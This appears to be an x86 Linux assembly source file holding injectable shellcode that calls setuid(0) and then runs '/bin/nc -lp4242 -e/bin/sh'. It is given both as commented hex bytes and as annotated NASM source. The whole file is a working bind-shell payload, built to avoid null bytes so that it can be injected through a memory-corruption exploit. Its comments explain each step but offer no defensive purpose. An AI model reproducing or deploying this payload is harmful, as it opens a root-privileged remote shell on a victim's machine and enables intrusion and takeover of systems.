 /* A MIX THIRD-PARTY PAYLOAD */

 /* setuid(0) from http://shell-storm.org/shellcode/files/shellcode-95.php */
 /* "\x31\xc0\x50\x50\xb0\x17\xcd\x80" */

 20c8:       31 c0                   xor    %eax,%eax
 20ca:       50                      push   %eax
 20cb:       50                      push   %eax
 20cc:       b0 17                   mov    $0x17,%al
 20ce:       cd 80                   int    $0x80


/* This assembly code translates in C in the form of
  int main() { 
    execve("/bin/nc", {"/bin/nc", "-lp4242", "-e/bin/sh"}, NULL);
  }
  We can find syscall numbers in /usr/include/asm/unistd_32.h */
/* "\x31\xc0\x50\x50\xb0\x17\xcd\x80"
    "\xeb\x2a\x5e\x31\xc0\x88\x46\x07\x88\x46\x0f\x88\x46\x19\x89\x76\x1a\x8d\x5e\x08"
    "\x89\x5e\x1e\x8d\x5e\x10\x89\x5e\x22\x89\x46\x26\xb0\x0b\x89\xf3\x8d\x4e\x1a\x8d"
    "\x56\x26\xcd\x80\xe8\xd1\xff\xff\xff\x2f\x62\x69\x6e\x2f\x6e\x63\x30\x2d\x6c\x70"
    "\x34\x32\x34\x32\x30\x2d\x65\x2f\x62\x69\x6e\x2f\x73\x68\x30\x43\x41\x36\x34\x37"
    "\x5f\x45\x4c\x49\x54\x45\x5f\x54\x45\x41\x4d" */
/* From https://github.com/valkheim */

section .deadcode exec write                              ; text section writable at runtime
global _start                                             ; export symbol

_start:                                                   ; entrypoint
  jmp short End                                           ; goto End label

Shellcode:
  pop esi                                                 ; esi contain the string in db

  xor eax, eax                                            ; zero eax (used to terminate string and zero out envp)
  mov[esi + 7], al                                        ; null terminate /bin/nc
  mov[esi + 15], al                                       ; null terminate -lp4242
  mov[esi + 25], al                                       ; null terminate -e/bin/sh

  mov[esi + 26], esi                                      ; CA64 is replaced by pointer to "/bin/nc"

  lea ebx, [esi + 8]                                      ; ebx is pointer to "-lp4242"
  mov[esi +30], ebx                                       ; 7_EL is replaced by pointer to "-lp4242"

  lea ebx, [esi + 16]                                     ; ebx is pointer to "-e/bin/sh"
  mov[esi + 34], ebx                                      ; ITE_ is replaced by pointer to "-e/bin/sh"

  mov[esi + 38], eax                                      ; zero execve envp

  mov al, 11                                              ; execve
  mov ebx, esi                                            ; esi is pointing to "/bin/nc"
  lea ecx, [esi + 26]                                     ; execve argv
  lea edx, [esi + 38]                                     ; execve envp
  int 0x80                                                ; syscall execute

End:
  call Shellcode                                          ; goto Shellcode label
  db '/bin/nc0-lp42420-e/bin/sh'         ; avoid (ro)data section. Can't zero data here (avoid null bytes in payload)
  ;   012345678901234567890123456789012345678901         ; esi offset scale
  ;   0         1         2         3         4
